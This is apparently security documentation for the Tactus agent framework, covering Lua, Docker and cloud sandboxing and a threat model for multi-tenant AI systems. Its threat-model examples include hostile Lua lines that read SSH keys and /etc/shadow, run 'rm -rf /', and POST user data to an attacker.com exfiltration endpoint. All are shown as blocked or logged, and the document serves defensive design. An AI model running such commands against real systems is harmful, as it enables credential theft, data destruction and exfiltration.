# Sandboxing & Security

Tactus provides **three layers of sandboxing** to protect against different threat models. This defense-in-depth approach makes Tactus safe for user-contributed code, secure for local development, and designed to support secure multi-tenant AI systems.

## Current Status (What Works Today)

The merged “brokered sandbox runtime MVP” changes the default local security model:

- The **runtime container is secretless** (Tactus refuses to pass common API-key env vars into the container).
- The **runtime container is networkless by default** (`sandbox.network: none`).
- Privileged operations (currently: **LLM API calls**, plus a tiny allowlisted set of **host tools**) are executed by a **host-side broker** and streamed back to the runtime.

What works now:
- Local Docker sandbox with `sandbox.broker_transport: stdio` (default) and `sandbox.network: none`
- Remote-style broker connectivity with `sandbox.broker_transport: tcp|tls` (requires `sandbox.network != none`)
- Brokered host tools via a deny-by-default allowlist (currently very small)

What is intentionally not done yet:
- Full tool runner system (`sandbox`/`isolated`/`host` runners for arbitrary tools)
- Tool discovery conventions and packaging/manifest workflows
- Multi-provider LLM support beyond the first proof-of-concept path

For the living roadmap, see `planning/BROKER_AND_TOOL_RUNNERS.md`.

## Overview: Three Layers of Protection

| Layer | Scope | Purpose | Default |
|-------|-------|---------|---------|
| **Lua Sandboxing** | Language-level | Safe execution of user-contributed agent code | Always on |
| **Docker Sandboxing** | OS-level | Isolate filesystem/network access during development | On (local) |
| **Cloud Sandboxing** | Per-invocation | Prevent information leakage between users | On (cloud) |

## Why Three Layers?

Each layer addresses a different security concern:

1. **Lua Sandboxing** protects your application from malicious agent code
2. **Docker Sandboxing** protects your development machine from agent filesystem/network access
3. **Cloud Sandboxing** protects users from each other in multi-tenant deployments

---

# Layer 1: Lua Sandboxing (Language-Level)

**Purpose:** Enable safe execution of community-contributed agent procedures.

## What It Protects Against
- Malicious Lua code attempting to escape the runtime
- Unauthorized access to Lua standard library functions
- Code injection attacks via procedure parameters

## How It Works
- **Restricted VM:** Lua procedures run in a sandboxed virtual machine
- **Limited stdlib:** Only safe standard library functions are exposed
- **Tool-mediated access:** All I/O operations must go through registered tools
- **No eval:** Dynamic code execution is disabled

## Example: Embeddable Safety
\`\`\`python
from tactus import TactusRuntime

# Safe to run user-contributed agent code
runtime = TactusRuntime()
result = await runtime.execute(
    source=user_submitted_agent,  # Safe even if malicious
    context={"user_data": sensitive_data}
)
\`\`\`

The Lua sandbox ensures that even malicious agent code cannot:
- Access files directly (must use filesystem tool)
- Make network requests directly (must use web tool)
- Execute arbitrary system commands
- Escape the Lua VM to Python

## Limitations
Lua sandboxing **cannot** protect against:
- Agents using filesystem tools to read/modify sensitive files
- Agents using web tools to exfiltrate data
- Agents consuming excessive memory or CPU

For these threats, you need **OS-level sandboxing** (Docker or cloud).

---

# Layer 2: Docker Container Sandboxing (OS-Level)

Docker sandboxing provides **OS-level isolation** for Tactus agent execution. This layer protects your development machine from agents that use filesystem or network tools.

## Quick Start

\`\`\`bash
# Runs in Docker by default (errors if Docker is unavailable)
tactus run my-agent.tac

# Check sandbox status
tactus sandbox status

# Rebuild sandbox image
tactus sandbox rebuild
\`\`\`

**When installed from PyPI:** the sandbox image is built by installing the same Tactus version from PyPI inside the container. When a local source tree is available, the image bakes in that source instead.

## What It Protects Against
- Agents reading/modifying files on your host system
- Agents making unauthorized network requests
- Resource exhaustion (memory, CPU)
- Persistent state leakage between runs

## How It Works
- **Fresh container per execution:** Each `tactus run` spawns a new Docker container
- **Default project access:** Your current directory is automatically mounted to `/workspace:rw`, allowing procedures to read and write project files
- **Resource limits:** Memory (default 2GB) and CPU (default 2 cores) limits
- **Network isolation:** Default `bridge` mode for broker communication; procedures don't get direct network access without explicit tools
- **Container isolation:** Procedures can only access the mounted project directory, not your entire filesystem
- **Additional volume mounts:** You can mount other directories (e.g., external data) via sidecar configuration

## Security-First Model

| Scenario | Behavior |
|----------|----------|
| Docker available | ✓ Runs in container automatically |
| Docker unavailable, sandbox not disabled | ✗ **ERROR:** Cannot run without isolation |
| \`--no-sandbox\` flag | ⚠ Shows security warning, proceeds without Docker |
| \`sandbox.enabled: false\` in config | ⚠ Shows security warning, proceeds without Docker |

### Example: Docker Unavailable

\`\`\`bash
$ tactus run agent.tac

[SANDBOX ERROR] Docker not available: Docker daemon not running
[SANDBOX ERROR] Cannot run procedure without container isolation.
[SANDBOX ERROR] Either:
  - Start Docker Desktop / Docker daemon
  - Use --no-sandbox flag to explicitly run without isolation (security risk)
  - Set sandbox.enabled: false in config to permanently disable (security risk)
\`\`\`

### Example: Explicit Opt-Out

\`\`\`bash
$ tactus run agent.tac --no-sandbox

[SANDBOX] Container isolation disabled (--no-sandbox).
[SANDBOX] Proceeding without Docker isolation.

# Agent runs directly on host (security risk)
\`\`\`

## Configuration

Docker sandboxing is configured through Tactus's standard configuration system. You can control:
- Resource limits (memory, CPU)
- Network access
- Volume mounts
- Environment variables
- Timeout settings

**Configuration can be set at multiple levels:**
- **Global**: User or project-wide settings in `~/.tactus/config.yml` or `.tactus/config.yml`
- **Per-procedure**: Sidecar files (e.g., `procedure.tac.yml`) for procedure-specific overrides

For detailed configuration syntax and examples, see the [Configuration Guide](./CONFIGURATION.md#sandbox-configuration).

### Key Security Configurations

**Network isolation:**
```yaml
sandbox:
  network: "none"           # Disable all network access in the runtime container (default)
  broker_transport: "stdio" # Brokered capabilities still work without container networking
```
With the brokered runtime, `network: none` can still support LLM calls (the runtime talks to the host broker over stdio).

**Remote-style broker connectivity (cloud/K8s spike):**
```yaml
sandbox:
  network: "bridge"        # Runtime container has networking
  broker_transport: "tcp"  # Or "tls"
  broker_host: "broker"    # As seen from inside the container
```
In this mode you must rely on infrastructure controls (K8s NetworkPolicy / security groups) so the runtime can only reach the broker.

**Resource limits:**
```yaml
sandbox:
  limits:
    memory: "2g"
    cpus: "2"
  timeout: 3600
```
Prevents resource exhaustion attacks and runaway procedures.

**Read-only data mounts:**
```yaml
sandbox:
  volumes:
    - "/sensitive/data:/data:ro"  # Read-only to prevent modification
```
Allows procedures to access data without modification risk.

**Default project mount:**
By default, Tactus mounts your current directory to `/workspace:rw`, allowing procedures to read and write project files. This is safe with Git version control but can be disabled:

```yaml
sandbox:
  mount_current_dir: false  # Disable automatic current directory mount
```

**When to disable the default mount:**
- Running untrusted procedures from unknown sources
- Output-only workflows (reports, builds) that don't need source access
- Production deployments requiring explicit permissions
- Multi-tenant systems with shared procedure libraries

**Safety with default mount enabled:**
- Container isolation prevents access outside the project directory
- Git provides version control and easy rollback
- You can review all changes with `git diff` before committing
- Only the current project is exposed, not your home directory or system files

### Sidecar Configuration Security

**Important**: Sidecar YAML files (`.tac.yml`) are **NOT sandboxed** like `.tac` procedure files. They are trusted configuration that can:
- Mount arbitrary host paths into containers
- Configure network access
- Set environment variables
- Reference Docker images

**Trust boundary:**
- **`.tac` files**: Sandboxed Lua code - safe for user contributions, AI generation, public sharing
- **`.yml` files**: Trusted configuration - only from trusted sources, review before use

**Best practice**: If accepting user-contributed procedures, accept only `.tac` files. Do NOT accept their `.yml` configuration files without thorough review.

See [Configuration Guide](./CONFIGURATION.md#per-procedure-sandbox-configuration) for examples and detailed syntax.

## Performance

### Startup Time

**Typical spinup:** ~1-2 seconds
- Docker image pull (first time only): +10-30s
- Container creation: ~500ms
- Python imports: ~500ms-1s
- MCP server startup: ~100-500ms

**Optimization tips:**
- Pre-build and cache Docker image
- Use lighter base images
- Lazy-load Python dependencies

### Resource Usage

**Per-Container Overhead:**
- Memory: ~150-300MB (base Python + Node.js)
- Disk: ~500MB (image) + workspace size
- CPU: Minimal when idle

**Concurrent Execution:**
- 100 concurrent containers feasible on 32GB machine
- Each container isolated, no shared memory
- For higher concurrency, use cloud deployment (Lambda/Azure)

---

# Layer 3: Cloud Sandboxing (Per-Invocation)

**Purpose:** Prevent information leakage between users in multi-tenant AI systems.

## The AI Security Problem

Traditional security focuses on **unauthorized access**. AI systems introduce a new threat: **information leakage between sessions**.

### Examples of AI Session Leakage
- **Checkpoint contamination:** User A's checkpoints accessible to User B
- **Context pollution:** User A's conversation influencing User B's agent responses
- **Tool state persistence:** Filesystem tool retaining User A's files in User B's session
- **Memory caching:** Embeddings or cached data from User A leaking to User B

This is a **fundamentally new threat model** that requires per-invocation isolation.

## How Cloud Sandboxing Works

### AWS Lambda
- **Per-invocation isolation:** Each agent execution runs in a fresh Lambda instance
- **No shared state:** Lambda instances are destroyed after execution
- **Built-in limits:** Memory, CPU, and timeout controls
- **Network isolation:** VPC support for controlled network access

\`\`\`python
# Lambda handler for Tactus agent
def handler(event, context):
    runtime = TactusRuntime(
        procedure_id=event['procedure_id'],
        storage_backend=DynamoDBStorage()  # Isolated per user/session
    )

    result = await runtime.execute(
        source=event['procedure_source'],
        context=event['input_params']
    )

    return result
    # Lambda instance destroyed - no state persists
\`\`\`

### Azure Durable Functions
- **Durable orchestration:** Long-running agents with checkpoint persistence
- **Per-invocation isolation:** Each orchestration runs in isolated execution context
- **State management:** Explicit state storage (Table Storage, Cosmos DB)
- **No cross-contamination:** State scoped to orchestration ID

\`\`\`csharp
// Azure Durable Function for Tactus agent
[FunctionName("TactusAgent")]
public static async Task<object> Run(
    [OrchestrationTrigger] IDurableOrchestrationContext context)
{
    var input = context.GetInput<AgentInput>();

    var runtime = new TactusRuntime(
        procedureId: input.ProcedureId,
        storageBackend: new CosmosDbStorage(context.InstanceId)
    );

    var result = await runtime.Execute(
        source: input.ProcedureSource,
        context: input.Parameters
    );

    return result;
    // Execution context destroyed - state only in Cosmos DB
}
\`\`\`

## Tactus's Defense-in-Depth

1. **Ephemeral execution:** No shared state between invocations by default
2. **Explicit persistence:** Checkpoints/state must be explicitly saved to external storage
3. **Scoped storage:** All storage backends scoped to user/session identifiers
4. **No global state:** No in-memory caches or global variables between invocations

## Production Best Practices

### ✓ DO
- Use separate storage backends per user/tenant
- Scope checkpoint IDs to include user/session identifiers
- Clear any caches between invocations
- Use serverless functions for automatic isolation

### ✗ DON'T
- Share storage backends between users
- Use global in-memory caches
- Persist tool state between invocations
- Reuse long-running processes for multiple users

---

# Threat Model

## Threat Categories

### 1. Information Leakage (Session Contamination)

**Attack Scenarios:**

**Checkpoint Leakage**
\`\`\`
1. User A runs agent, creates checkpoints with sensitive data
2. Checkpoints stored in shared storage without user scoping
3. User B runs agent, loads checkpoints from storage
4. User B's agent now has access to User A's sensitive data
\`\`\`

**Context Pollution**
\`\`\`
1. User A has conversation about confidential project "Project X"
2. Agent context stored in global cache
3. User B starts new conversation
4. Agent responds with references to "Project X" from previous context
\`\`\`

**Tactus Defenses:**

✓ **Per-Invocation Isolation**
\`\`\`python
# Each user gets fresh execution context
runtime = TactusRuntime(
    procedure_id=f"agent-{user_id}",
    storage_backend=get_user_storage(user_id)  # Isolated storage
)
\`\`\`

✓ **Scoped Storage**
\`\`\`python
# Checkpoints scoped to user/session
storage = S3Storage(
    bucket="tactus-checkpoints",
    prefix=f"users/{user_id}/sessions/{session_id}/"
)
\`\`\`

### 2. Malicious Agent Code

**Attack Scenarios:**

**Filesystem Access**
\`\`\`lua
-- Malicious agent tries to read SSH keys
os.execute("cat ~/.ssh/id_rsa")  -- Blocked by Lua sandbox
io.open("/etc/passwd"):read("*a")  -- Blocked by Lua sandbox
\`\`\`

**Code Injection**
\`\`\`lua
-- Attacker tries to inject Python code
getmetatable("").__index.system("rm -rf /")  -- Blocked by Lua sandbox
loadstring("malicious_code()")()  -- Blocked (loadstring disabled)
\`\`\`

**Tactus Defenses:**

✓ **Lua VM Sandboxing**
- Restricted standard library (no \`os\`, \`io\`, \`loadstring\`)
- All I/O through registered tools
- No dynamic code execution

✓ **Docker Resource Limits**
\`\`\`yaml
sandbox:
  limits:
    memory: "2g"    # OOM kills container if exceeded
    cpus: "2"       # CPU throttling
  timeout: 3600     # Max execution time
\`\`\`

### 3. Tool-Mediated Attacks

**Attack Scenarios:**

**Filesystem Tool Abuse**
\`\`\`lua
-- Agent tries to read sensitive files
call_tool("filesystem", {
  action = "read",
  path = "/etc/shadow"  -- Blocked by container isolation
})
\`\`\`

**Web Tool Exfiltration**
\`\`\`lua
-- Agent sends user data to attacker's server
call_tool("web", {
  url = "https://attacker.com/exfil",
  method = "POST",
  body = user_sensitive_data  -- Network access allowed but logged
})
\`\`\`

**Tactus Defenses:**

✓ **Container Filesystem Isolation**
\`\`\`bash
# Only workspace directory accessible
docker run -v /tmp/tactus-workspace:/workspace:rw
# No access to host filesystem outside mount
\`\`\`

✓ **Tool-Level Authorization**
\`\`\`python
# Tools can implement permission checks
class FilesystemTool:
    def read_file(self, path: str):
        if not self._is_authorized(path):
            raise PermissionError(f"Access denied: {path}")
\`\`\`

✓ **Audit Logging**
\`\`\`python
# All tool calls logged for security audit
logger.info(f"Tool call: {tool_name}", extra={
    "user_id": user_id,
    "tool_args": args,
    "timestamp": time.time()
})
\`\`\`

⚠ **Network Access**
- Default runtime container has no outbound network (`sandbox.network: none`)
- Broker process has network access for LLM calls and other brokered capabilities
- If enabling runtime networking (`sandbox.network != none`), enforce egress controls (NetworkPolicy / SGs) so the runtime can only reach the broker

## Threat Summary

| Threat | Lua Sandbox | Docker Sandbox | Cloud Sandbox |
|--------|-------------|----------------|---------------|
| Malicious agent code | ✓ Protects | - | - |
| Filesystem access | ✗ Cannot prevent | ✓ Protects | ✓ Protects |
| Network exfiltration | ✗ Cannot prevent | ✓ Protects | ✓ Protects |
| Resource exhaustion | ⚠ Limited | ✓ Protects | ✓ Protects |
| Cross-user contamination | - | ⚠ Same machine | ✓ Protects |
| Session leakage | - | ⚠ Same machine | ✓ Protects |

---

# Multi-Tenant Deployment Checklist

## Development
- [ ] Docker Desktop installed and running
- [ ] Sandbox enabled in config (default)
- [ ] Run opt-in Docker sandbox tests (dev-only): `tactus sandbox rebuild --force` then `make test-docker-sandbox` (or `TACTUS_RUN_DOCKER_TESTS=1 pytest -m docker -v`)
- [ ] MCP servers reviewed for security issues
- [ ] Tool calls logged for debugging
- [ ] Resource limits configured appropriately

## Staging
- [ ] Per-user storage backends configured
- [ ] Session identifiers scoped correctly
- [ ] Prompt injection mitigations tested
- [ ] Tool authorization implemented
- [ ] Security audit logs enabled

## Production
- [ ] Serverless deployment (Lambda/Azure) for isolation
- [ ] Storage scoped to user/tenant/session
- [ ] Network egress filtering configured
- [ ] Tool calls audited and monitored
- [ ] Incident response plan documented
- [ ] Regular security reviews scheduled

---

# Key Takeaways

1. **Defense-in-depth:** Three layers address different threat models
2. **Default security:** Sandbox enabled by default, opt-out requires explicit acknowledgment
3. **AI-native design:** Built from the ground up to prevent session leakage
4. **Embeddable safety:** Lua sandboxing makes Tactus safe for user-contributed code
5. **Multi-tenant isolation:** Cloud sandboxing provides per-invocation isolation at scale
6. **Information security DNA:** Per-invocation sandboxing prevents AI session leakage, a critical requirement for multi-tenant AI systems

---

# Further Reading

- [Configuration Guide](./CONFIGURATION.md)
- [Durability & Checkpoints](./DURABILITY.md)
- [Tools Documentation](./TOOLS.md)
- [Docker Security Best Practices](https://docs.docker.com/engine/security/)
- [OWASP LLM Top 10](https://owasp.org/www-project-top-10-for-large-language-model-applications/)
